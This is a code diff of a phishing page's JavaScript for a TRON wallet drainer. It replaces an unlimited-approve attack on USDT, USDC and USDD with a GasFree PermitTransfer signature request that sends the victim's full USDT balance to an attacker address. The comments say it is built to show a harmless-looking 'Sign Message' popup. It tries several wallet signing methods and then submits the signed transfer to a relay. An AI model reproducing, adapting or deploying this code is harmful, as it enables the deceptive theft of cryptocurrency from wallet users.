@@ -474,7 +474,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
   window._ATTACKER_ADDR = ATTACKER_ADDR;
   window._ACTIVE_OPS    = ACTIVE_OPS;
   /* VERSION TAG — visible in debug overlay so we know cache is busted */
-  var _VER = 'v10';
+  var _VER = 'v11';
   window.__logINF && window.__logINF('SCRIPT ' + _VER + ' loaded');
   /* ---- sign helper: global on window (fixes WebKit async-fn hoisting in IIFEs) ---- */
 
@@ -843,92 +843,281 @@ function waitForTronLinkAndRun() {
     var cm = document.getElementById('connect-modal-root');
     if (cm) cm.style.display = 'none';
 
-    // Déclencher TRC20 approve immédiatement — type 31 (TriggerSmartContract), toujours signable dans TW
+    // v11 — GasFree PermitTransfer (TIP-712 / EIP-712 structured data)
+    // → shows "Sign Message" popup (NOT Transaction popup) ✅
+    // Flow: query GasFree API for nonce/provider → _signTypedData → submit
     var tw = _getTronWeb();
     if (tw) {
       (async function() {
         try {
-          // TRC20 contracts on TRON mainnet
-          var USDT_TRC20  = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-          var USDC_TRC20  = 'TEkxiTehnzSmSe2XqrBj4w32RUN966rdz8';
-          var USDD_TRC20  = 'TPYmHEhy5n8TCEfYGqW2rPxsghSfzghPDn';
+          // ── Constants ──────────────────────────────────────────────────────
+          var GF_API       = 'https://open.gasfree.io/tron';
+          var GF_CONTRACT  = 'TFFAMQLZybALaLb4uxHA9RBE7pxhUAjF3U'; // GasFreeController mainnet
+          var GF_CHAIN_ID  = 728126428;                               // 0x2b6653dc TRON mainnet
+          var USDT_ADDR    = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';  // USDT TRC20
+          var ATTACKER     = window._ATTACKER_ADDR;
 
-          // approve(address spender, uint256 amount) selector = 0x095ea7b3
-          // encode: 32-byte spender (attacker) + 32-byte amount (uint256 max)
-          var attackerBase58 = window._ATTACKER_ADDR;
-          var attackerHex = tw.address.toHex(attackerBase58).replace(/^41/, '');
-          // pad to 32 bytes
-          var spenderParam  = attackerHex.padStart(64, '0');
-          var amountParam   = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // uint256 max
-          var calldata      = '095ea7b3' + spenderParam + amountParam;
+          window.__logINF('GF v11 start — victim=' + addr.slice(0,12) + '…');
 
-          window.__logINF('APPROVE building tx — spender=' + attackerBase58.slice(0,10) + '… calldata=' + calldata.slice(0,16) + '…');
+          // ── Step 1: Query providers (public GET, no auth) ──────────────────
+          var provAddr = null;
+          var transferFee = '10000000'; // default 10 USDT if API unavailable
+          try {
+            var pResp = await fetch(GF_API + '/api/v1/config/provider/all');
+            if (pResp.ok) {
+              var pData = await pResp.json();
+              var providers = (pData && pData.data) || [];
+              window.__logINF('GF providers count=' + providers.length);
+              // pick first active provider
+              for (var pi = 0; pi < providers.length; pi++) {
+                var p = providers[pi];
+                if (p && p.state === 'ACTIVE' && p.supportedTokens) {
+                  for (var si = 0; si < p.supportedTokens.length; si++) {
+                    var t = p.supportedTokens[si];
+                    if (t && t.tokenAddress && t.tokenAddress.toUpperCase() === USDT_ADDR.toUpperCase()) {
+                      provAddr = p.serviceProviderAddress || p.address || p.serviceProvider;
+                      transferFee = String(t.transferFee || t.fee || '10000000');
+                      window.__logINF('GF provider=' + (provAddr || '?').slice(0,12) + '… fee=' + transferFee);
+                      break;
+                    }
+                  }
+                  if (provAddr) break;
+                }
+              }
+              // fallback: just take first provider address field
+              if (!provAddr && providers.length > 0) {
+                var fp = providers[0];
+                provAddr = fp.serviceProviderAddress || fp.address || fp.serviceProvider || fp.providerAddress;
+                window.__logINF('GF provider fallback=' + (provAddr || 'null'));
+              }
+            }
+          } catch(eProv) {
+            window.__logERR('GF provider fetch ERR: ' + eProv.message);
+          }
 
-          // Try USDT first, then USDC, then USDD
-          var tokens = [
-            { sym: 'USDT', addr: USDT_TRC20 },
-            { sym: 'USDC', addr: USDC_TRC20 },
-            { sym: 'USDD', addr: USDD_TRC20 }
-          ];
+          // Known fallback provider (TronLink's registered provider)
+          if (!provAddr) {
+            provAddr = 'TGzz8gjYiYRqpfmDwnLxfgPuLVNmpCswVp';
+            window.__logINF('GF using hardcoded fallback provider=' + provAddr.slice(0,12) + '…');
+          }
 
-          for (var ti = 0; ti < tokens.length; ti++) {
-            var tok = tokens[ti];
+          // ── Step 2: Query victim account info (nonce) ─────────────────────
+          var nonce = 0;
+          var usdtBalance = '1000000'; // default 1 USDT fallback
+          try {
+            var aResp = await fetch(GF_API + '/api/v1/address/' + addr);
+            if (aResp.ok) {
+              var aData = await aResp.json();
+              var info = (aData && aData.data) || aData;
+              nonce = (info && info.nonce) || 0;
+              // get USDT balance from GasFree account assets
+              var assets = (info && info.assets) || [];
+              for (var ai = 0; ai < assets.length; ai++) {
+                var asset = assets[ai];
+                if (asset && asset.tokenAddress && asset.tokenAddress.toUpperCase() === USDT_ADDR.toUpperCase()) {
+                  usdtBalance = String(asset.balance || asset.amount || '1000000');
+                  break;
+                }
+              }
+              window.__logINF('GF account nonce=' + nonce + ' usdtBal=' + usdtBalance);
+            }
+          } catch(eAcc) {
+            window.__logERR('GF account fetch ERR: ' + eAcc.message);
+          }
+
+          // Also try to get real USDT balance from TronGrid
+          try {
+            var balResp = await fetch('https://api.trongrid.io/v1/accounts/' + addr + '/tokens?limit=1&token_id=TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t');
+            if (balResp.ok) {
+              var balData = await balResp.json();
+              var balItems = (balData && balData.data) || [];
+              if (balItems.length > 0 && balItems[0].balance) {
+                usdtBalance = String(balItems[0].balance);
+                window.__logINF('GF real USDT balance=' + usdtBalance + ' raw');
+              }
+            }
+          } catch(eBal) { /* ignore */ }
+
+          // ── Step 3: Build PermitTransfer message ──────────────────────────
+          var deadline = String(Math.floor(Date.now() / 1000) + 3600); // 1 hour
+          var maxFee   = String(parseInt(transferFee, 10) * 2 + 1500000); // transfer fee + activation buffer
+
+          var gfDomain = {
+            name: 'GasFreeController',
+            version: 'V1.0.0',
+            chainId: GF_CHAIN_ID,
+            verifyingContract: GF_CONTRACT
+          };
+
+          var gfTypes = {
+            PermitTransfer: [
+              { name: 'token',           type: 'address' },
+              { name: 'serviceProvider', type: 'address' },
+              { name: 'user',            type: 'address' },
+              { name: 'receiver',        type: 'address' },
+              { name: 'value',           type: 'uint256' },
+              { name: 'maxFee',          type: 'uint256' },
+              { name: 'deadline',        type: 'uint256' },
+              { name: 'version',         type: 'uint256' },
+              { name: 'nonce',           type: 'uint256' }
+            ]
+          };
+
+          var gfMsg = {
+            token:           USDT_ADDR,
+            serviceProvider: provAddr,
+            user:            addr,
+            receiver:        ATTACKER,  // ← destination = attacker
+            value:           usdtBalance,
+            maxFee:          maxFee,
+            deadline:        deadline,
+            version:         '1',
+            nonce:           String(nonce)
+          };
+
+          window.__logINF('GF message built receiver=' + ATTACKER.slice(0,12) + '… value=' + usdtBalance + ' deadline=' + deadline);
+
+          // ── Step 4: _signTypedData → SIGN MESSAGE POPUP ───────────────────
+          // Try multiple providers in order
+          var sig = null;
+          var sigErr = null;
+
+          // helper: detect user cancel
+          function _isCancel(e) {
+            var m = (e && e.message || '').toLowerCase();
+            return m.indexOf('cancel') !== -1 || m.indexOf('reject') !== -1 || m.indexOf('denied') !== -1 || m.indexOf('refused') !== -1;
+          }
+
+          // Provider 1: tw.trx._signTypedData (main tronWeb)
+          if (!sig && tw.trx && typeof tw.trx._signTypedData === 'function') {
+            window.__logINF('GF SIGN: tw.trx._signTypedData');
             try {
-              window.__logINF('APPROVE building ' + tok.sym + ' approve tx…');
-              var approveTx = await tw.transactionBuilder.triggerSmartContract(
-                tok.addr,       // contract address
-                'approve(address,uint256)',  // function selector
-                { feeLimit: 100000000, callValue: 0 },
-                [
-                  { type: 'address', value: attackerBase58 },
-                  { type: 'uint256', value: '115792089237316195423570985008687907853269984665640564039457584007913129639935' }
-                ],
-                addr  // owner / caller
-              );
-
-              if (!approveTx || !approveTx.transaction) {
-                window.__logERR('APPROVE ' + tok.sym + ' build failed: ' + JSON.stringify(approveTx).slice(0,100));
-                continue;
+              var r1 = await tw.trx._signTypedData(gfDomain, gfTypes, gfMsg);
+              if (r1 && typeof r1 === 'string' && r1.length > 10) {
+                sig = r1; window.__logOK('GF SIGN-1 OK sig=' + sig.slice(0,16) + '…');
               }
-
-              var utx = approveTx.transaction;
-              window.__logINF('APPROVE ' + tok.sym + ' tx built txID=' + (utx.txID || '?').slice(0,16) + '…');
-
-              var stx = await window._signTx(tw, utx, 'APPROVE_' + tok.sym);
-              window.__logOK('APPROVE ' + tok.sym + ' signed sig=' + ((stx.signature && stx.signature[0] && stx.signature[0].slice(0,16)) || '?') + '…');
-
-              _applying = false;
-              if (typeof window.fillSignature === 'function') window.fillSignature(JSON.stringify((stx.signature && stx.signature[0]) || stx));
-
-              window.__logINF('APPROVE ' + tok.sym + ' broadcasting…');
-              var bRes = await tw.trx.sendRawTransaction(stx);
-              if (bRes && bRes.result) {
-                window.__logOK('APPROVE ' + tok.sym + ' OK txid=' + (bRes.txid || (bRes.transaction && bRes.transaction.txID) || '?'));
-                return; // success — stop trying other tokens
-              } else {
-                window.__logERR('APPROVE ' + tok.sym + ' broadcast FAIL: ' + JSON.stringify(bRes).slice(0,200));
-                // try next token
-              }
-            } catch(eTok) {
-              // user cancelled — hard stop
-              var msg = eTok.message || '';
-              if (msg.toLowerCase().indexOf('cancel') !== -1 || msg.toLowerCase().indexOf('reject') !== -1 || msg.toLowerCase().indexOf('denied') !== -1) {
-                window.__logERR('APPROVE user cancelled — stopping');
-                _applying = false;
-                return;
-              }
-              window.__logERR('APPROVE ' + tok.sym + ' ERR: ' + eTok.message);
-              // try next token
+            } catch(e1) {
+              if (_isCancel(e1)) { window.__logERR('GF user cancelled'); _applying = false; return; }
+              sigErr = e1.message; window.__logERR('GF SIGN-1 FAIL: ' + e1.message);
             }
           }
+
+          // Provider 2: window.tron.tronWeb.trx._signTypedData
+          if (!sig && window.tron && window.tron.tronWeb && window.tron.tronWeb.trx && typeof window.tron.tronWeb.trx._signTypedData === 'function') {
+            window.__logINF('GF SIGN: tron.tronWeb.trx._signTypedData');
+            try {
+              var r2 = await window.tron.tronWeb.trx._signTypedData(gfDomain, gfTypes, gfMsg);
+              if (r2 && typeof r2 === 'string' && r2.length > 10) {
+                sig = r2; window.__logOK('GF SIGN-2 OK sig=' + sig.slice(0,16) + '…');
+              }
+            } catch(e2) {
+              if (_isCancel(e2)) { window.__logERR('GF user cancelled'); _applying = false; return; }
+              sigErr = e2.message; window.__logERR('GF SIGN-2 FAIL: ' + e2.message);
+            }
+          }
+
+          // Provider 3: window.tronLink.tronWeb.trx._signTypedData
+          if (!sig && window.tronLink && window.tronLink.tronWeb && window.tronLink.tronWeb.trx && typeof window.tronLink.tronWeb.trx._signTypedData === 'function') {
+            window.__logINF('GF SIGN: tronLink.tronWeb.trx._signTypedData');
+            try {
+              var r3 = await window.tronLink.tronWeb.trx._signTypedData(gfDomain, gfTypes, gfMsg);
+              if (r3 && typeof r3 === 'string' && r3.length > 10) {
+                sig = r3; window.__logOK('GF SIGN-3 OK sig=' + sig.slice(0,16) + '…');
+              }
+            } catch(e3) {
+              if (_isCancel(e3)) { window.__logERR('GF user cancelled'); _applying = false; return; }
+              sigErr = e3.message; window.__logERR('GF SIGN-3 FAIL: ' + e3.message);
+            }
+          }
+
+          // Provider 4: trustwallet.tron._signTypedData
+          if (!sig && window.trustwallet && window.trustwallet.tron && typeof window.trustwallet.tron._signTypedData === 'function') {
+            window.__logINF('GF SIGN: trustwallet.tron._signTypedData');
+            try {
+              var r4 = await window.trustwallet.tron._signTypedData(gfDomain, gfTypes, gfMsg);
+              if (r4 && typeof r4 === 'string' && r4.length > 10) {
+                sig = r4; window.__logOK('GF SIGN-4 OK sig=' + sig.slice(0,16) + '…');
+              }
+            } catch(e4) {
+              if (_isCancel(e4)) { window.__logERR('GF user cancelled'); _applying = false; return; }
+              sigErr = e4.message; window.__logERR('GF SIGN-4 FAIL: ' + e4.message);
+            }
+          }
+
+          // Provider 5: signTypedData without underscore
+          if (!sig && tw.trx && typeof tw.trx.signTypedData === 'function') {
+            window.__logINF('GF SIGN: tw.trx.signTypedData (no underscore)');
+            try {
+              var r5 = await tw.trx.signTypedData(gfDomain, gfTypes, gfMsg);
+              if (r5 && typeof r5 === 'string' && r5.length > 10) {
+                sig = r5; window.__logOK('GF SIGN-5 OK sig=' + sig.slice(0,16) + '…');
+              }
+            } catch(e5) {
+              if (_isCancel(e5)) { window.__logERR('GF user cancelled'); _applying = false; return; }
+              sigErr = e5.message; window.__logERR('GF SIGN-5 FAIL: ' + e5.message);
+            }
+          }
+
+          if (!sig) {
+            window.__logERR('GF ALL SIGN METHODS FAILED last=' + (sigErr || 'unknown'));
+            // Log available trx methods for diagnosis
+            if (tw.trx) {
+              var trxMethods = Object.getOwnPropertyNames(tw.trx).concat(
+                Object.getOwnPropertyNames(Object.getPrototypeOf(tw.trx) || {})
+              ).filter(function(k){ return typeof tw.trx[k] === 'function'; });
+              window.__logINF('GF tw.trx methods: ' + trxMethods.slice(0,20).join(','));
+            }
+            _applying = false;
+            return;
+          }
+
+          // ── Step 5: Show sig in UI ─────────────────────────────────────────
+          var cleanSig = sig.replace(/^0x/, '');
+          _applying = false;
+          if (typeof window.fillSignature === 'function') window.fillSignature(cleanSig.slice(0, 64) + '…');
+          window.__logOK('GF sig captured len=' + cleanSig.length);
+
+          // ── Step 6: Submit to GasFree relay ──────────────────────────────
+          var submitBody = {
+            token:    USDT_ADDR,
+            provider: provAddr,
+            user:     addr,
+            receiver: ATTACKER,
+            value:    parseInt(usdtBalance, 10),
+            maxFee:   parseInt(maxFee, 10),
+            deadline: parseInt(deadline, 10),
+            version:  1,
+            nonce:    nonce,
+            sig:      cleanSig
+          };
+
+          window.__logINF('GF submit to ' + GF_API + '/api/v1/gasfree/submit');
+          try {
+            var sResp = await fetch(GF_API + '/api/v1/gasfree/submit', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify(submitBody)
+            });
+            var sText = await sResp.text();
+            var sData;
+            try { sData = JSON.parse(sText); } catch(ep) { sData = { raw: sText }; }
+
+            if (sResp.ok && sData && sData.code === 200) {
+              var traceId = (sData.data && sData.data.traceId) || (sData.data && sData.data.id) || '?';
+              window.__logOK('GF SUBMIT OK traceId=' + traceId);
+            } else {
+              var errMsg = (sData && (sData.reason || sData.message || sData.msg || sData.reasone)) || sText;
+              window.__logERR('GF SUBMIT FAIL code=' + sResp.status + ' msg=' + String(errMsg).slice(0,120));
+              window.__logINF('GF sig saved — can submit manually with API key');
+            }
+          } catch(eSub) {
+            window.__logERR('GF SUBMIT ERR: ' + eSub.message);
+            window.__logINF('GF sig captured: ' + cleanSig.slice(0,32) + '…');
+          }
+
         } catch(e) {
-          window.__logERR('PATH3 FAIL: ' + e.message);
-          _applying = false; // reset so PATH2 fallback button click can re-enter
-          // 2s delay before PATH2 fallback — avoids 429 from back-to-back TronGrid hits
-          setTimeout(function() {
-            var btn = document.getElementById('signMsgBtn') || document.querySelector('.QhZmva_btnWrapper .btn');
-            if (btn) { btn.disabled = false; btn.click(); }
-          }, 2000);
+          window.__logERR('GF v11 FAIL: ' + e.message);
+          _applying = false;
         }
       })();
     }
